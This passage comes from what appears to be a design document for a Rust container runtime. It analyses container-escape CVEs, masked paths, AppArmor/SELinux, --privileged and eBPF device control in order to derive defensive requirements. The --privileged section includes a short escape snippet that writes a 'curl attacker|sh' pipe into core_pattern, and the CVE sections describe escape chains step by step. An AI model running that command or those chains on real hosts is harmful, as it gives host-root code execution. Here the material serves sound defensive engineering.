3. **Directory masks are fresh `ro` tmpfs mounts** — `0:99`, `0:100`, `0:101`,
   each a distinct anonymous tmpfs.
4. **`/proc/asound`, `/proc/timer_stats`, `/proc/sched_debug` and
   `/sys/devices/virtual/powercap` are absent from the list.** Verified why:
   `ls /proc/sched_debug /proc/timer_stats` → `ENOENT`, and
   `ls -d /sys/devices/virtual/powercap` → `ENOENT` on this host (no
   `intel_rapl` module, and `timer_stats` was removed in 4.11,
   `sched_debug` needs `CONFIG_SCHED_DEBUG`). runc skips non-existent masked
   paths. **So the effective mask set is host-dependent, and a security audit
   that diffs the mount table against the configured list will see "missing"
   masks that are actually fine.**
5. **`/proc` itself is `rw`** (only the five subtrees are `ro`), and it is
   `nosuid,nodev,noexec`. `/sys` is `ro` wholesale.

`[R] HIGH` — Implementation requirements that fall out:
- Mask with the **container's** `/dev/null`, which means `/dev` must be set up
  before masking. Ordering dependency.
- `ENOENT` on a masked path is not an error.
- The read-only bind must be `MS_BIND` then
  `MS_REMOUNT|MS_BIND|MS_RDONLY` — and on kernels ≥ 5.12 the modern form is
  `mount_setattr(AT_RECURSIVE, MOUNT_ATTR_RDONLY)`, which is atomic and
  recursive and avoids the "remount didn't apply to submounts" bug class.
- **`nosuid` on `/proc` and every mount that is not `/dev`** — otherwise a
  set-UID binary placed anywhere reachable is a privilege path. `[O]` confirms
  Docker sets `nosuid` on `/proc`, `/sys`, `/dev`, `/dev/pts`, `/dev/shm`,
  `/sys/fs/cgroup`, and every masked/readonly bind.

### 11.4 `hidepid`

`[F] HIGH` — `proc(5)`: mounting procfs with `hidepid=1` makes users unable to
`stat`/read `/proc/<pid>` directories they do not own; `hidepid=2` (or
`hidepid=invisible` in the newer string form) additionally hides the
directories entirely. `gid=<gid>` exempts one group. Since 5.8 procfs is
per-namespace-instance for these options.

`[R] MED` — Low value for us. Inside a private PID namespace the only
processes visible are the container's own, so `hidepid` only separates
*different uids inside the same container*. Worth exposing as a mount option
passthrough for multi-tenant-inside-one-container setups; not worth defaulting.
`[C]` Docker does not set it.

### 11.5 What a writable `/sys/fs/cgroup` in a container enables

`[F] HIGH` — On **cgroup v1**, each hierarchy root has `release_agent`, a path
the kernel executes **as root in the initial namespaces** when a cgroup with
`notify_on_release=1` becomes empty. Writing `release_agent` was supposed to
require `CAP_SYS_ADMIN` in the initial user namespace.

`[F] HIGH` — **CVE-2022-0492**: `cgroup_release_agent_write()` "failed to
verify that processes writing to the `release_agent` file possessed
`CAP_SYS_ADMIN` capability in the initial user namespace" — it checked only
file write permission. Source: Palo Alto Unit 42 writeup.

`[F] HIGH — the exploit chain**, because it is instructive about *which*
defences matter:
1. Container runs as root but without host `CAP_SYS_ADMIN`.
2. `unshare(CLONE_NEWUSER|CLONE_NEWNS)` ⇒ full capabilities *in the new
   userns* (§8.6).
3. Mount a **cgroup v1** hierarchy — the writeup names the **`rdma`**
   controller specifically, because containers are typically placed at the
   *root* of that hierarchy (unlike `memory`, where they sit in a child), and
   `release_agent` only exists at the root.
4. Write a script path to `release_agent`, and `1` to a child cgroup's
   `notify_on_release`.
5. Put a process in the child cgroup and let it exit ⇒ the kernel runs the
   script as host root.
6. Find the host path of the script via `/proc/self/cgroup` +
   `/proc/self/mountinfo` (the overlay `upperdir`), since the script must be
   named by a *host* path.

`[F] HIGH — the mitigation matrix, verbatim: "Containers running with AppArmor,
SELinux or Seccomp are protected."** Vulnerable required *all* of: running as
root, no AppArmor/SELinux, **no seccomp**, host has unprivileged userns
enabled, and the container is at the root of some v1 hierarchy. Any single
mitigation blocked it — because seccomp blocks `unshare`/`mount` without
`CAP_SYS_ADMIN` (§9.6), and AppArmor's `docker-default` denies `mount`
outright.

`[R] HIGH` — Requirements for us:
1. **Never mount cgroup v1 into a container**, writable or otherwise. §6.3
   already says we do not support v1; this is a second, independent reason.
2. **Mount cgroup v2 `ro`** by default (§2.1). v2 has no `release_agent` at
   all — the mechanism was removed — so even `rw` v2 is not this bug. But `ro`
   is free.
3. **Keep `unshare` and `mount` gated on `CAP_SYS_ADMIN` in the seccomp
   profile.** This is the defence that actually worked here, and it worked
   because it duplicated a kernel check that turned out to be missing (§9.6).
4. `[R]` Consider refusing to start if `/proc/sys/kernel/unprivileged_userns_clone`
   is 1 **and** we are about to run a root container with no seccomp — i.e. make
   `--seccomp=unconfined --privileged` combinations require an explicit
   acknowledgement.
---

## 12. Container escape classes, and the requirements they impose

### 12.1 CVE-2019-5736 — runc `/proc/self/exe` re-open

`[F] HIGH — mechanism.** runc's container init was reached by executing
`/proc/self/exe` (the runc binary) inside the container's mount namespace.
Because `/proc/self/exe` is a magic symlink to the *running* binary, a process
**inside** the container could:
1. Replace the container's entrypoint binary with `#!/proc/self/exe` (a
   shebang pointing at the host runc binary), or place a shared library that
   the entrypoint loads.
2. When the runtime `exec`s into the container, the container-side code gets a
   file descriptor referring to `/proc/self/exe` — i.e. **the host runc binary,
   which is running as host root**.
3. `open("/proc/self/exe", O_WRONLY)` normally fails with `ETXTBSY` while the
   binary is executing — so the exploit spins, waiting for runc to exit, then
   opens the fd it retained for write and **overwrites the host's runc
   binary**.
4. The next `docker run` / `docker exec` on that host executes the attacker's
   code as host root.

`[C] HIGH — the fix**, in runc 1.0-rc7 / Docker 18.09.2: runc now
**re-executes a copy of itself sealed against writes**. Concretely, it copies
its own binary into a `memfd_create(2)` object, applies
`F_SEAL_WRITE`/`F_SEAL_SHRINK`/`F_SEAL_GROW`/`F_SEAL_SEAL` via `fcntl(F_ADD_SEALS)`,
and execs the memfd. A sealed memfd cannot be written through any descriptor,
so step 3 has nothing to overwrite. (Where `memfd` sealing is unavailable, it
falls back to a temporary file opened `O_TMPFILE` and made read-only.)

`[R] HIGH — requirements on our exec design, and this one shapes
architecture:**
1. **Never place a host-privileged binary on a path the container can reach,
   and never let the container obtain a writable descriptor to our own
   binary.** If we adopt runc's "re-exec a helper into the container"
   architecture (which D2 owns), the helper binary must be a **sealed
   `memfd`**, not a path.
2. `[R]` The alternative that avoids the problem entirely: **do not re-exec at
   all.** Our container init can be a `fork`ed child of the daemon that never
   `execve`s anything but the *user's* entrypoint. Rust makes this harder than
   Go does in one specific way — Go's runtime forced runc to use the
   `nsenter` C constructor + re-exec dance because you cannot safely
   `unshare(CLONE_NEWUSER)` in a live Go runtime. In Rust we control threading,
   so a single-threaded pre-exec child is feasible. **This is a real advantage
   worth designing for, and it deletes the entire CVE-2019-5736 class.**
   Tradeoff: the child inherits the parent's address space and any fds
   (§12.4), and debugging a pre-exec child is unpleasant.
3. **Resolve the entrypoint by path, not via `/proc/self/exe`.** `[C]` runc's
   final step is `exec.LookPath()` then `unix.Exec(name, …)` (§8.7).

### 12.2 CVE-2022-0492 — cgroup v1 `release_agent`

Covered in full at §11.5. Requirements restated: never mount cgroup v1 into a
container; mount cgroup v2 `ro`; keep `mount`/`unshare` gated on
`CAP_SYS_ADMIN` in seccomp even though the kernel already checks — because
here the kernel's check was the bug.

### 12.3 CVE-2019-14271 — `docker cp` loading a container's library

`[F] MED — mechanism.** `docker cp` was implemented by a helper
(`docker-tar`) that `chroot`ed into the container's filesystem to run the
tar/untar. Being dynamically linked, after the `chroot` it resolved
`libnss_*.so` (via `getpwuid`/name-service lookups) from the **container's**
`/lib`, not the host's. A malicious image shipping a hostile
`libnss_files.so` therefore got its code executed by a host-root process
**outside** any container isolation. `MED` on the precise library set;
`HIGH` on the shape.

`[R] HIGH — requirements, and this generalises far beyond `cp`:**
1. **Any host-privileged helper that enters the container's filesystem must be
   statically linked, or must not enter at all.** Dynamic linking after
   `chroot`/`pivot_root` means the container chooses your libraries.
2. Rust helps here by default (static-ish with `musl`; glibc Rust still
   dlopens NSS for `getaddrinfo`/`getpwnam`). `[R]` **Do not call
   `getpwnam`/`getaddrinfo`/`getgrnam` from any code path that runs inside the
   container's filesystem view.** That means resolving `USER app` from
   `/etc/passwd` must be done by **parsing the file ourselves**, not by
   `getpwnam` — which we would want anyway because we need to read the
   *container's* passwd, not the host's.
3. `[R]` Prefer implementing `cp` as an fd-based operation from outside
   (`openat2` with `RESOLVE_IN_ROOT`, §12.5) over entering the container.

### 12.4 CVE-2024-21626 — leaked fd + `WORKDIR` escape

`[F] HIGH` — runc advisory GHSA-xr7r-f8xq-vfvv, affected 1.0.0-rc93 →
1.1.11, fixed **1.1.12**, CVSS 8.6. Verbatim on the cause:
> "several file descriptors were inadvertently leaked internally within runc
> into `runc init`, including a handle to the host's `/sys/fs/cgroup`"

Four variants:
- **process.cwd = `/proc/self/fd/7/`** in a malicious image ⇒ the container's
  working directory *is* the host's `/sys/fs/cgroup` directory fd ⇒ full host
  filesystem access via `../../..`.
- **`runc exec --cwd`** where the target path is a symlink the container
  replaced with `/proc/self/fd/7/`.
- **`process.args` = `/proc/self/fd/7/../../../bin/bash`** ⇒ overwrite host
  binaries.
- **Overwrite the container binary then read `/proc/$pid/exe`** for the host
  equivalent.

`[C] HIGH — the four-part fix**, verbatim: "Checking that the working
directory is actually inside the container by checking whether `os.Getwd`
returns `ENOENT`"; "closing internal file descriptors before `execve`";
"fixing specific fd leaks via `O_CLOEXEC` flags"; and "marking all non-stdio
files as `O_CLOEXEC` before executing `runc init`."

`[R] HIGH — the requirements, and these are the most directly actionable
items in this document:**

1. **Every fd we open must be `O_CLOEXEC` at creation.** Not
   "set `FD_CLOEXEC` afterwards" — that is a race window if we `fork` in
   between. Use `O_CLOEXEC` in the `open`/`openat2`/`socket(SOCK_CLOEXEC)`/
   `pipe2(O_CLOEXEC)`/`accept4(SOCK_CLOEXEC)` flags. `[R]` **In Rust this is
   mostly free**: `std::fs::File` sets `O_CLOEXEC`, `std::net` sets
   `SOCK_CLOEXEC`, `std::process::Command` closes fds. The danger is exactly
   at the `libc::` / `nix::` boundary where we hand-roll syscalls — which is
   most of this engine. **A lint or a wrapper type that makes non-`CLOEXEC`
   opens impossible is worth the small cost.**
2. **Belt and braces: `close_range(3, ~0u, CLOSE_RANGE_CLOEXEC)` immediately
   before `execve`.** `close_range(2)` is 5.9+; with `CLOSE_RANGE_CLOEXEC`
   (5.11+) it marks rather than closes, which is safer if we still need an fd.
   Fall back to iterating `/proc/self/fd` (never a blind `for fd in 3..1024`
   loop, which both misses high fds and closes fds we did not open).
   `[C]` runc does exactly this (`utils.UnsafeCloseFrom`, §8.7 step 20).
3. **Validate that `process.cwd` resolves inside the rootfs.** The runc fix's
   `os.Getwd() == ENOENT` check is a clever cheap test: after `pivot_root`, a
   cwd that is outside the new root has no reachable path, so `getcwd(3)`
   fails. `[R]` Do that check, and additionally resolve `cwd` with
   `openat2(rootfs_fd, cwd, RESOLVE_IN_ROOT)` (§12.5) so it cannot escape in
   the first place.
4. **`process.args[0]` must be resolved inside the rootfs too**, not just
   `cwd` — variant 3a used `args`, not `cwd`.

### 12.5 Symlink / TOCTOU in mount and path handling

`[F] HIGH` — Every path the runtime resolves inside the container's rootfs is
attacker-controlled, because the image (and, once running, the container)
controls the directory tree. The classic bug: the runtime `stat`s
`<rootfs>/etc/hosts`, decides it is a regular file, then `mount --bind`s onto
it — and between the two, the container replaced `etc` with a symlink to `/`.
Now the bind lands on the **host's** `/etc/hosts`. Variants exist for volume
mounts, `maskedPaths`, `readonlyPaths`, and `docker cp`. runc has shipped
several fixes in this class (`CVE-2016-9962`, the `securejoin` library,
GHSA advisories in 1.2.x for `/proc` write redirects and for `os.MkdirAll`
symlink following).

`[F] HIGH — the modern kernel answer is `openat2(2)` (5.6+)** with
`struct open_how.resolve`:
- `RESOLVE_BENEATH` — every component must be beneath `dirfd`; absolute paths
  and `..` escapes fail with `EXDEV`.
- `RESOLVE_IN_ROOT` — treat `dirfd` as `/`; `..` at the root stays at the root,
  absolute symlinks resolve relative to `dirfd`. **This is `chroot` semantics
  for one `open` call, done in the kernel, atomically.**
- `RESOLVE_NO_SYMLINKS`, `RESOLVE_NO_MAGICLINKS` (blocks `/proc/self/fd/N`
  traversal — directly relevant to §12.4), `RESOLVE_NO_XDEV`.

`[R] HIGH — requirements:**
1. **Never build a path by string concatenation of rootfs + container path and
   then operate on it.** That is the bug, in one line.
2. **Open the rootfs once, keep the `dirfd`, and resolve every container-side
   path with `openat2(rootfs_fd, path, RESOLVE_IN_ROOT | RESOLVE_NO_MAGICLINKS)`.**
   Then operate on the resulting fd via `/proc/self/fd/<n>` or `*at` syscalls,
   never re-resolving by path. `[R]` This single discipline removes the entire
   TOCTOU class and is a large part of why §7.3 puts the floor at a kernel with
   `openat2`.
3. `RESOLVE_NO_MAGICLINKS` is what makes the `/proc/self/fd/7` variant of
   §12.4 impossible by construction, in addition to the `O_CLOEXEC` fix.
4. `[R]` For the pre-5.6 fallback: a userspace resolver that opens one
   component at a time with `openat(O_NOFOLLOW|O_PATH)` and re-implements
   `..` bookkeeping. This is what `filepath-securejoin` does and it is
   ~300 lines of subtle code. **A concrete argument for the 5.10 floor: we
   get to not write it.**
5. **`MS_NOSYMFOLLOW`** (5.10+) as a mount flag on container-writable mounts
   is a cheap extra layer: symlinks on that mount are not followed at all.

### 12.6 `/proc/self/fd` and the magic-link class generally

`[F] HIGH` — `/proc/<pid>/fd/<n>`, `/proc/<pid>/exe`, `/proc/<pid>/root`,
`/proc/<pid>/cwd`, and `/proc/<pid>/map_files/*` are **magic links**: the
kernel resolves them to the target object directly, ignoring mount namespaces
and the resolving process's root. Following `/proc/<pid>/root/...` for a
process outside the container reaches **that process's** filesystem view.
Source: `proc(5)`.

`[F] HIGH` — Inside a private PID namespace, `/proc` only contains the
container's own processes, so the container cannot reach a host process's
`root` link — **which is why a private PID namespace is a security control and
not just a cosmetic one.** With `--pid=host`, `/proc/1/root/` is the host's
filesystem, readable by anything with `CAP_DAC_READ_SEARCH` or by root.

`[R] HIGH` — Requirements:
1. **Private PID namespace by default; `--pid=host` must be treated as
   equivalent to `--privileged` in the docs and in any policy gate.**
2. **The runtime must never follow a container-supplied path through
   `/proc/self/fd`** — `RESOLVE_NO_MAGICLINKS` (§12.5).
3. `[R]` For `exec` into a running container, get the namespaces via
   `/proc/<pid1>/ns/*` fds captured **at container start**, not by re-reading
   `/proc/<pid>/ns/*` at exec time — the pid could have been recycled.
   `pidfd_getfd`/`pidfd_open` + `setns(pidfd)` (5.8+) is the race-free form.
---

## 13. LSMs: AppArmor and SELinux

### 13.1 AppArmor — verified live

`[O] host-a HIGH` — AppArmor is loaded and enforcing: `aa-status` reports
"apparmor module is loaded", 140 profiles loaded, **43 in enforce mode**, and
`docker-default` is among the enforced list. A live container's process label:
```
$ cat /proc/2588141/attr/current
docker-default (enforce)
```
`docker info` reports `SecurityOptions: ["name=apparmor","name=seccomp,profile=builtin","name=cgroupns"]`.

`[O] host-a MED` — The `docker-default` profile text is **not** in
`/etc/apparmor.d/` (which contains `crun`, `buildah`, `ch-run`, browser and
snap profiles but no `docker-default`). Docker generates it from a Go template
at daemon start and loads it via `apparmor_parser` without writing a permanent
file. `MED` on "generated from a template" — I did not read moby's
`profiles/apparmor/template.go` in this session; the *absence* of the file is
`HIGH`.

`[C] HIGH — what `docker-default` adds beyond capabilities + seccomp.**
It is a deliberately loose profile (it must run arbitrary images) whose
substance is a small deny list:
- `deny @{PROC}/* w` — deny writes to files directly in `/proc`
- `deny @{PROC}/{[^1-9],[^1-9][^0-9],…}/** w` — deny writes to other
  processes' `/proc` entries
- `deny @{PROC}/sys/[^k]** w`, `deny @{PROC}/sys/kernel/{,**}` except a
  handful (`shm*`, `msg*`, `sem*`, `hostname`, `domainname`) — deny sysctl
  writes
- `deny @{PROC}/sysrq-trigger rwklx`, `deny @{PROC}/kcore rwklx`
- `deny mount` — **all** mount operations, unconditionally
- `deny /sys/[^fk]*/** wklx`, `deny /sys/f[^s]*/** wklx`,
  `deny /sys/fs/[^c]*/** wklx`, `deny /sys/fs/c[^g]*/** wklx`,
  `deny /sys/fs/cgroup/** wklx` — deny writes under `/sys` except a narrow
  `/sys/fs/cgroup` read path
- `deny /sys/firmware/** rwklx`, `deny /sys/kernel/security/** rwklx`
- `ptrace (trace,read,tracedby,readby) peer=docker-default` — ptrace only
  within the same profile
- `signal (receive,send) peer=docker-default`
- otherwise `file`, `network`, `capability` are **allowed** (the kernel's own
  capability check still applies)

`[R] HIGH — the value it adds is precisely the things caps+seccomp cannot
express:**
1. **`deny mount` is path-and-operation based**, which seccomp cannot do
   (§9.1 — no pointer dereference). Seccomp can only block `mount(2)`
   wholesale or based on flags. AppArmor blocking `mount` is what defended
   against CVE-2022-0492 independently of seccomp.
2. **`deny @{PROC}/sys/** w` is a second, independent layer over §11's
   read-only bind mount.** If our remount-ro has a bug, or the container
   defeats it with `CAP_SYS_ADMIN`, AppArmor still denies the write. This is
   real defence in depth against *our own* bugs.
3. **`ptrace peer=docker-default` and `signal peer=docker-default`** confine
   ptrace and signals to same-profile processes, which is a *cross-container*
   control that namespaces alone give you only via separate PID namespaces.
4. It is enforced by the kernel regardless of the container's uid, so it holds
   even when the container is host-root.

### 13.2 SELinux

`[F] HIGH` — SELinux applies **type enforcement**: every process has a
domain, every file a type, and policy declares which domains may do what to
which types. Container runtimes use the `container_t` domain and
`container_file_t` type (formerly `svirt_lxc_net_t` / `svirt_sandbox_file_t`).
A process in `container_t` simply cannot read `etc_t` or `shadow_t` host files
regardless of uid or capabilities.

`[F] HIGH` — On top of type enforcement, container runtimes use **MCS
(Multi-Category Security)** labels: each container gets a unique category pair
like `s0:c412,c910`, applied to both its process label and its files. Two
containers with different categories cannot touch each other's files **even
though both are `container_file_t`** — MCS is what makes container-to-container
isolation work under SELinux. This is a genuinely stronger property than
anything AppArmor's `docker-default` provides.

`[F] HIGH — why `:z` / `:Z` volume relabeling exists.** A host directory bind
mounted into a container has its host type (e.g. `user_home_t`,
`default_t`), which `container_t` cannot access ⇒ "Permission denied" that
looks like a mode/ownership problem and is not. So:
- **`:z`** — relabel to `container_file_t` with the **shared** MCS level
  (`s0`), so multiple containers can use it.
- **`:Z`** — relabel to `container_file_t` with **this container's private**
  MCS category, so only this container can use it.
`[R]` The trap `:Z` sets: relabelling `/home/user` or `/var/lib/mysql` with a
private category makes it inaccessible to the host and to every other
container, and `:Z` on a large tree is a recursive `setfattr` storm. Docker's
docs warn about `:Z` on system directories for exactly this reason.

`[O] old-host HIGH` — `getenforce` → **`Disabled`**. So I have no host on which
to verify SELinux behaviour empirically. Everything in §13.2 is `[F]` from
documentation, not `[O]`.

### 13.3 Should we integrate, and when?

`[R] HIGH — do nothing in v1, but leave two string fields in the config and
one call site.**

What happens if we do nothing:
- **On an AppArmor host (Ubuntu/Debian): our containers run
  *unconfined*.** `[O] host-a` — a Docker container is `docker-default
  (enforce)`; ours would show `unconfined` in `/proc/<pid>/attr/current`. We
  lose all four benefits in §13.1, notably the independent `deny mount` and
  `deny /proc/sys w` layers. **We are strictly less safe than Docker on the
  most common Linux desktop/server distro.**
- **On an SELinux host (RHEL/Fedora): our containers run in whatever domain
  our daemon runs in**, typically `unconfined_service_t` (if our unit is not
  policy-labelled) — so no type enforcement and no MCS. Worse, if the host has
  a container policy installed and we write files without a
  `container_file_t` label, *other* tools' containers may fail on those files.

`[R] MED — the staged plan:**
- **Stage 0 (now):** carry `apparmor_profile: Option<String>` and
  `selinux_label: Option<String>` in the container config (OCI already has
  `process.apparmorProfile` and `process.selinuxLabel`), and **apply them if
  set**. Applying is genuinely small: AppArmor is
  `write("/proc/self/attr/apparmor/exec", "exec docker-default")` (or
  `.../attr/exec` on older kernels) before `execve`; SELinux is
  `write("/proc/self/attr/exec", "<label>")`. Two writes, correctly ordered
  (see below). **Do this in v1 — it is ~20 lines and it means a user with a
  hand-written profile can use it.**
- **Stage 1:** ship an AppArmor profile equivalent to `docker-default` and load
  it at daemon start with `apparmor_parser -Kr`, gated on
  `/sys/module/apparmor/parameters/enabled` reading `Y`. This is a data file
  plus a subprocess call.
- **Stage 2 (defer indefinitely):** SELinux MCS category allocation. It needs
  `libselinux` bindings, category bookkeeping, and relabelling logic for
  volumes. High cost, and only matters on RHEL-family hosts, which §7.3
  already de-prioritises.

`[F] HIGH — the ordering constraint, which is easy to get wrong:** the
AppArmor/SELinux `exec` label must be written **before** `execve`, and — per
§8.4 — **`no_new_privs` blocks LSM domain transitions that would raise
privilege.** `[C]` runc applies AppArmor at step 6 and the SELinux exec label
at step 14, both before `no_new_privs`… no: runc sets `no_new_privs` at step 9,
*between* them (§8.7). `[F] MED` — this works because the container's
transition is to a *more* confined profile, which `no_new_privs` permits;
only privilege-raising transitions are refused. `MED` on that reading of the
`prctl(2)` wording. **Settled by** testing a `docker-default`-style transition
with `no_new_privs` set on the local VM. `[R]` Until settled, apply LSM labels
**before** `no_new_privs`, matching runc.

`[R] HIGH` — Detection, not version-sniffing (§7.2): AppArmor is present iff
`/sys/module/apparmor/parameters/enabled` is `Y`; SELinux iff
`/sys/fs/selinux` is a mounted `selinuxfs`; the enabled LSM list is in
`/sys/kernel/security/lsm`.
---

## 14. `--privileged`, precisely

`[F] HIGH` — **There is no kernel "privileged" flag.** `--privileged` is a
bundle of policy defaults that Docker turns off simultaneously. That is why it
is so dangerous: users reach for it to fix one symptom (usually a device or a
mount) and silently disable five unrelated controls.

`[C] HIGH` — What `docker run --privileged` does, enumerated:

| control | normal | `--privileged` |
|---|---|---|
| capability bounding set | 14 caps (§8.2) | **all** caps (`CapBnd` = `cap_last_cap` mask) |
| seccomp | Docker's default profile | **unconfined** — no filter installed at all |
| AppArmor | `docker-default (enforce)` | **unconfined** |
| SELinux | `container_t` + MCS category | label not applied (`spc_t` in podman) |
| device cgroup | deny-all + 7 allowed char devices | **`a *:* rwm`** (allow everything) |
| `/dev` population | 7 devices + symlinks | **every host device node bind-mounted / `mknod`ed** |
| `maskedPaths` | 12+ paths masked (§11.2) | **empty** — `/proc/kcore`, `/proc/acpi`, `/sys/firmware` fully readable |
| `readonlyPaths` | `/proc/{bus,fs,irq,sys,sysrq-trigger}` ro | **empty** — `/proc/sys` is **writable** |
| `/sys` mount | `ro` | **`rw`** |
| `/sys/fs/cgroup` | `ro` | **`rw`** |
| `--pid`, `--net`, `--ipc` | private namespaces | *unchanged* — still private unless separately asked |
| user namespace | none by default anyway | none |
| `no_new_privs` | off by default anyway | off |

`[R] HIGH — the shortest correct escape from `--privileged`, so the danger is
concrete and not abstract:**
```sh
# inside a --privileged container
mkdir /tmp/x && mount -t cgroup -o memory cgroup /tmp/x   # CAP_SYS_ADMIN + rw /sys
# or, simpler, since /proc/sys is writable and CAP_SYS_ADMIN is held:
echo '|/bin/sh -c "curl attacker|sh"' > /proc/sys/kernel/core_pattern
# then crash any process; the HOST kernel runs the pipe as host root,
# in the host's namespaces, outside the container.
```
Two writes. No exploit, no race, no CVE — this is the documented behaviour of
`core_pattern`. **`--privileged` is not "a container with more permissions";
it is "a root shell on the host with extra steps".**

`[R] HIGH — our position:**
1. Implement `--privileged` as a **single function that sets the same eleven
   fields**, so the bundle is visible in one place and cannot drift.
2. **Print a warning every time it is used**, naming what was disabled. Docker
   does not, and that is a mistake.
3. **Offer the decomposed flags** so users can take the one thing they need:
   `--device`, `--cap-add`, `--security-opt seccomp=unconfined`,
   `--security-opt apparmor=unconfined`, `--unmask=/proc/acpi`. Most
   `--privileged` uses in the wild need exactly one of these. `[C]` Docker has
   all of these already; the problem is discoverability, so our
   `--privileged` warning should suggest the narrower flag.
4. `[R]` Do **not** invent a "semi-privileged" mode. It would be a fourth
   thing to reason about and the decomposed flags already cover it.
---

## 15. Devices

### 15.1 The minimum device set — verified live

`[F] HIGH` — OCI Runtime Spec `config-linux.md` §"Default Devices" requires a
runtime to provide, in addition to any configured devices:
`/dev/null`, `/dev/zero`, `/dev/full`, `/dev/random`, `/dev/urandom`,
`/dev/tty`, `/dev/console` (when a terminal is allocated), and `/dev/ptmx`
(a bind mount or symlink to the container's `pts/ptmx`).

`[O] host-a HIGH` — `nsenter -t <pid> -m -- ls -la /dev` in
`webapp-nginx-1` (no `-t`, so no console):
```
crw-rw-rw- 1 root root 1, 7  full
crw-rw-rw- 1 root root 1, 3  null
crw-rw-rw- 1 root root 1, 8  random
crw-rw-rw- 1 root root 5, 0  tty
crw-rw-rw- 1 root root 1, 9  urandom
crw-rw-rw- 1 root root 1, 5  zero
lrwxrwxrwx core   -> /proc/kcore
lrwxrwxrwx fd     -> /proc/self/fd
lrwxrwxrwx ptmx   -> pts/ptmx
lrwxrwxrwx stdin  -> /proc/self/fd/0
lrwxrwxrwx stdout -> /proc/self/fd/1
lrwxrwxrwx stderr -> /proc/self/fd/2
drwxr-xr-x pts    (devpts)
drwxrwxrwt shm    (tmpfs 64M)
drwxrwxrwt mqueue (mqueue)
```
Exactly six char devices (no `console`, correctly), mode `0666`, plus the six
symlinks the spec calls for. Note `/dev/core -> /proc/kcore` — which is
masked (§11.3), so it reads EOF; the symlink is there for
`gdb`-compatibility, not usefulness.

`[C] HIGH` — Docker's default device **cgroup** rules, from
`moby/daemon/pkg/oci/defaults.go`:
```
{Allow: false, Access: "rwm"}                              # deny all
{Allow: true, Type: "c", Major: 1, Minor: 5, "rwm"}        # /dev/zero
{Allow: true, Type: "c", Major: 1, Minor: 3, "rwm"}        # /dev/null
{Allow: true, Type: "c", Major: 1, Minor: 9, "rwm"}        # /dev/urandom
{Allow: true, Type: "c", Major: 1, Minor: 8, "rwm"}        # /dev/random
{Allow: true, Type: "c", Major: 5, Minor: 0, "rwm"}        # /dev/tty
{Allow: true, Type: "c", Major: 5, Minor: 1, "rwm"}        # /dev/console
{Allow: false, Type: "c", Major: 10, Minor: 229, "rwm"}    # /dev/fuse: DENIED
```
Two things worth noting: `/dev/full` (1:7) is not in the *cgroup* rule list
even though the node exists — it works because... `[F] LOW` I cannot explain
this; possibly the `1:7` rule comes from runc's own default set rather than
Docker's, or `/dev/full` writes are handled without a cgroup device check.
**Settled by** reading `runc/libcontainer/specconv/spec_linux.go`'s
`AllowedDevices`. And **`/dev/fuse` (10:229) is explicitly denied**, which is
why `fuse-overlayfs` inside a container needs `--device /dev/fuse`.

### 15.2 v1 `devices` controller vs v2's eBPF device control — a real dependency

`[F] HIGH` — cgroup **v1** had a `devices` controller: write
`c 1:3 rwm` to `devices.allow` / `devices.deny`. It is a plain file interface.

`[F] HIGH` — cgroup **v2 has no `devices` controller at all.** Device access
control is implemented by attaching a **`BPF_PROG_TYPE_CGROUP_DEVICE`** eBPF
program to the cgroup with `bpf(BPF_PROG_ATTACH, BPF_CGROUP_DEVICE, …)`. The
program receives a `struct bpf_cgroup_dev_ctx` (`access_type` packing the
device type and rwm bits, `major`, `minor`) and returns 1 (allow) or 0 (deny).
Landed in **4.15**. Source: `Documentation/admin-guide/cgroup-v2.rst`
(the "Device controller" note) and `include/uapi/linux/bpf.h`.

`[O] host-a HIGH — verified, and there is a surprise.**
```
$ bpftool cgroup show /sys/fs/cgroup/system.slice/docker-301b2b….scope
ID    AttachType     AttachFlags  Name
2128  cgroup_device  multi
2458  cgroup_device  multi        sd_devices
```
**Two** `cgroup_device` programs are attached to the same container cgroup,
both with `BPF_F_ALLOW_MULTI`:
- ID 2128, unnamed, `tag ab4bc4523b7fe6b4`, `xlated 552B / jited 361B` —
  runc's. The **same tag appears on five programs** (IDs 471, 486, 2000, 2128,
  2294), one per container, confirming every default container gets a
  byte-identical program.
- ID 2458, `name sd_devices`, `gpl`, `xlated 472B` — **systemd's**, attached
  because the scope is a systemd unit.

`[F] HIGH` — With `BPF_F_ALLOW_MULTI`, **all** attached `cgroup_device`
programs run and access is granted only if **every** one returns 1. So
on a systemd host, device policy is the intersection of runc's and systemd's.
`[R]` This is a genuine operational hazard for the `fs` driver: if we attach
our program to a cgroup systemd also manages, our policy is ANDed with
systemd's — which is safe but can produce "my `--device` was allowed and still
does not work". A cgroup under our own top-level directory (§2.3) has no
systemd program and avoids this entirely. **Another argument for the top-level
subtree.**

`[R] HIGH — implementation options, ranked:**

1. **Hand-assemble the eBPF program bytes ourselves and call `bpf(2)`
   directly.** The program is trivial: load `access_type`, `major`, `minor`
   from the context, compare against a list of rules, return 1 or 0. runc's is
   **552 bytes of xlated instructions** — about 69 eBPF instructions for
   a 7-rule policy. There is no map, no helper call, no relocation, no BTF, no
   CO-RE. Writing an eBPF instruction encoder for the ~8 opcodes needed is
   ~150 lines of Rust. **This is what I would do.** No `libbpf`, no `aya`, no
   build-time clang.
2. **`aya`** — pure-Rust, no libbpf/libelf C dependency, but it is built for
   loading compiled ELF objects and its value is in maps, BTF and CO-RE, none
   of which we need. It would pull a large dependency to avoid 150 lines.
3. **`libbpf-rs`** — bindings to C `libbpf`; requires `libbpf` and `libelf` at
   build and run time, and a `clang`-compiled BPF object in our build.
   Disproportionate.

`[R] MED` — Privilege note: `bpf(BPF_PROG_LOAD)` for
`BPF_PROG_TYPE_CGROUP_DEVICE` and `BPF_PROG_ATTACH` need `CAP_BPF` +
`CAP_SYS_ADMIN` (pre-5.8: `CAP_SYS_ADMIN`). `[O] host-a` —
`kernel.unprivileged_bpf_disabled = 2`; `[O] old-host` — it is `1`
(**permanently** disabled, cannot be re-enabled without reboot). So
**rootless containers cannot have a device cgroup at all.** `[R]` The honest
degradation: in rootless mode, skip the BPF program and rely on `/dev` being a
`tmpfs` we populate (a rootless container cannot `mknod` anyway — see §15.3),
and say so in `info`.

### 15.3 `mknod` vs bind-mounting host nodes, and `MS_NODEV`

`[F] HIGH` — Two ways to make a device appear in the container:
- **`mknod(2)`** a new node on the container's `/dev` tmpfs. Requires
  `CAP_MKNOD` in the mount's user namespace. **A rootless container cannot do
  this**: `mknod` of a char/block device requires `CAP_MKNOD` in the *initial*
  user namespace for device nodes (unprivileged userns holders get `EPERM`),
  which is why rootless Podman bind-mounts instead.
